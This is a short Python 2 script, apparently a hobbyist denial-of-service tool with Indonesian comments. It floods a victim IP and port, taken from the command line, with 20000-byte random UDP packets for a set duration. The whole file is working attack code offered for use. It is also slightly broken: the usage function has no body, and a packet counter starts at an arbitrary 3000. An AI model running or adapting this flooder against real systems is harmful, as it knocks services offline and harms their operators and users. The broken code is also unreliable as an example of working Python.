import time

import socket

import random

import sys

def usage():

def flood(victim, vport, duration):

    # Support us yaakk... :)

    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 20000 representasi satu byte ke server

    bytes = random._urandom(20000)

    timeout =  time.time() + duration

    sent = 3000

    while 1:

        if time.time() > timeout:

            break

        else:

            pass

        client.sendto(bytes, (victim, vport))

        sent = sent + 1

        

def main():

    print len(sys.argv)

    if len(sys.argv) != 4:

        usage()

    else:

        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':

    main()

